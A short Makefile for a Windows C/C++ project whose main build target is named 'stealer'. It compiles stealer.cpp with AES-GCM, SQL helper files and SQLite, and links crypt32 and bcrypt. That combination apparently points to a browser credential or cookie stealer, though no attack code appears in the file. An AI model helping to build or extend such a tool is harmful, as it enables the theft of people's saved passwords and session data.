CC=gcc
CXX=g++
LDFLAGS=  -static -lshell32  -lshlwapi -lcrypt32 -lbcrypt -lUserenv
PDB=-g
BIN=bin
ifeq ($(OS),Windows_NT)
	RM=powershell /c rm
else
	RM=rm
endif

all: stealer

# run sqlite3 before 
stealer:
	$(CXX)  stealer.cpp aes_gcm.cpp SQLfunctions.cpp sqlite3.o $(LDFLAGS) -o stealer.exe 
file:
	$(CC)  filestuff.c   sqlite3.o $(LDFLAGS) -o f.exe 
sqtest:
	$(CXX) sqtest.cpp sqlite3.o $(LDFLAGS) -o sqt.exe
sqlite3:
	$(CC) -c sqlite3.c
clean:
	$(RM) *.exe 
	$(RM) *.o
